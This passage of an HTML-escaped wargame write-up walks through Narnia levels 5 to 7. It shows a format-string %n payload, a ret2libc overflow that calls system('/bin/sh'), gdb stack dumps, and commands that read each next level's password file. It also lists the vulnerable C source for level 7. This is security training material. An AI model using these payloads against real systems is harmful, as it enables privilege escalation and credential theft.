put the address if &lt;code&gt;i&lt;/code&gt; into that location like and shorten the number of &lt;code&gt;%x&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*5&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we have the address of &lt;code&gt;i&lt;/code&gt;, we use &lt;code&gt;%n&lt;/code&gt; to write to that address, remembering
to remove one &lt;code&gt;%x&lt;/code&gt; to keep the right length.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*4 + &amp;#39;%n&amp;#39;&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we see that we&amp;rsquo;ve written the length of the string into &lt;code&gt;i&lt;/code&gt;. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*3 + &amp;#39;%500d&amp;#39; + &amp;#39;%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We&amp;rsquo;re &lt;em&gt;28&lt;/em&gt; over the target, so let&amp;rsquo;s reduce the padding&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*3 + &amp;#39;%472d&amp;#39; + &amp;#39;%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-06:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 06&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;environ;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;// tired of fixing values...&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// - morla&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;get_sp&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
       &lt;span style=&#34;color: #f8f8f2&#34;&gt;__asm__(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;movl %esp,%eax&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;
               &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;and $0xff000000, %eax&amp;quot;&lt;/span&gt;
               &lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[]){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;b1[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;b2[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp)(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;))&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;puts,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s b1 b2&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #75715e&#34;&gt;/* clear environ */&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;environ[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(environ[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(environ[i]));&lt;/span&gt;
	&lt;span style=&#34;color: #75715e&#34;&gt;/* clear argz    */&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(argv[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(argv[i]));&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(b1,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(b2,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #75715e&#34;&gt;//if(((unsigned long)fp &amp;amp; 0xff000000) == 0xff000000)&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(((&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)fp&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0xff000000&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;get_sp())&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp(b1);&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;In this rather complicated looking listing we notice a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;line 17 is a function pointer to &lt;code&gt;puts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;line 33 calls the function &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;line 31 prevents &lt;code&gt;fp&lt;/code&gt; from pointing to anything in our frame&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The last lines means we need to point &lt;code&gt;fp&lt;/code&gt; to a call in a system library.
This is going to be a &lt;a href=&#34;https://en.wikipedia.org/wiki/Return-to-libc_attack&#34;&gt;ret to libc attack&lt;/a&gt;. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute &lt;code&gt;system(&#39;/bin/sh&#39;)&lt;/code&gt;. As luck would have it, &lt;code&gt;puts&lt;/code&gt; and
&lt;code&gt;system&lt;/code&gt; both have the same function definition: &lt;code&gt;int system(const char *command);&lt;/code&gt; and
&lt;code&gt;int puts(const char *s);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s fire up gdb and figure out our addresses.
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia6@melinda:/narnia$ gdb ./narnia6 -q
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 &amp;lt;+0&amp;gt;:	push   %ebp
   0x0804855a &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x0804855c &amp;lt;+3&amp;gt;:	push   %ebx
   0x0804855d &amp;lt;+4&amp;gt;:	and    $0xfffffff0,%esp
   0x08048560 &amp;lt;+7&amp;gt;:	sub    $0x30,%esp

    &amp;lt;-- snip --&amp;gt;

   0x0804869b &amp;lt;+322&amp;gt;:	movl   $0xffffffff,(%esp)      
   0x080486a2 &amp;lt;+329&amp;gt;:	call   0x8048410 &amp;lt;exit@plt&amp;gt;
   0x080486a7 &amp;lt;+334&amp;gt;:	lea    0x20(%esp),%eax
   0x080486ab &amp;lt;+338&amp;gt;:	mov    %eax,(%esp)
   0x080486ae &amp;lt;+341&amp;gt;:	mov    0x28(%esp),%eax
   0x080486b2 &amp;lt;+345&amp;gt;:	call   *%eax                &amp;lt;-- calling *fp*
   0x080486b4 &amp;lt;+347&amp;gt;:	movl   $0x1,(%esp)
   0x080486bb &amp;lt;+354&amp;gt;:	call   0x8048410 &amp;lt;exit@plt&amp;gt;
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680:	0xffffd6a0	0xffffd8ac	0x00000021	0x08048712
0xffffd690:	0x00000003	0xffffd754	0x63636363	0x63636363
0xffffd6a0:	0x64646464	0x61616100	0x62626262	0x00000000
0xffffd6b0:	0x080486c0	0xf7fca000	0x00000000	0xf7e3ca63
0xffffd6c0:	0x00000003	0xffffd754	0xffffd764	0xf7feacea
0xffffd6d0:	0x00000003	0xffffd754	0xffffd6f4	0x08049978
0xffffd6e0:	0x08048290	0xf7fca000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x32aaee13	0x0a932a03	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000003	0x08048450
0xffffd710:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd720:	0x00000003	0x08048450	0x00000000	0x08048471
0xffffd730:	0x08048559	0x00000003	0xffffd754	0x080486c0
0xffffd740:	0x08048730	0xf7feb180
(gdb) p system
$&lt;span style=&#34;color: #f8f8f2&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt; 0xf7e62cd0 &amp;lt;system&amp;gt;
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;What I did here was to disassemble the &lt;code&gt;main&lt;/code&gt; function and find out where
&lt;code&gt;fp&lt;/code&gt; is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to &lt;code&gt;fp&lt;/code&gt;. What we see is
that &lt;code&gt;$esp&lt;/code&gt; points to &lt;code&gt;0xffffd6a0&lt;/code&gt;, which is where the last 4 values of
&lt;code&gt;b2&lt;/code&gt; are stored. This is also the argument that will be passed to the &lt;code&gt;fp&lt;/code&gt; call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to &lt;code&gt;/bin/sh&lt;/code&gt;, and we want &lt;code&gt;fp&lt;/code&gt; to point to &lt;code&gt;system&lt;/code&gt;. This is
the reason for the &lt;code&gt;p system&lt;/code&gt;, it tells us the location of &lt;code&gt;system&lt;/code&gt;.
Also note that our &lt;code&gt;segfault&lt;/code&gt; is showing us the last
4 digits of &lt;code&gt;b1&lt;/code&gt;. Perfect, I can use that to overwrite &lt;code&gt;fp&lt;/code&gt; with the address of
&lt;code&gt;system&lt;/code&gt; and I should be good to go.&lt;/p&gt;

&lt;p&gt;As this is a little more advanced, let&amp;rsquo;s go over the steps:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Get the address of the argument to whatever &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;Figure out how to overwrite that with our argument&lt;/li&gt;
&lt;li&gt;Get the address of &lt;code&gt;system&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Overwrite what &lt;code&gt;fp&lt;/code&gt; points to with &lt;code&gt;system&lt;/code&gt;&amp;rsquo;s address&lt;/li&gt;
&lt;li&gt;Assemble payload and hopefully get a shell&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So the last step:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia6@melinda:/narnia$ /games/narnia/narnia6 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;a&amp;#39;*8 + &amp;#39;\xd0\x2c\xe6\xf7&amp;#39; +&amp;#39; &amp;#39;+ &amp;#39;b&amp;#39;*8 + &amp;#39;/bin/sh&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-07:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 07&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;goodfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;();&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hackedfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;();&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;vuln&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;format){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf)();&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(buffer,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer));&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;goodfunction() = %p&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;hackedfunction() = %p&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hackedfunction);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;before : ptrf() = %p (%p)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I guess you want to come to the hackedfunction...&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sleep(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction;&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;format);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf();&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

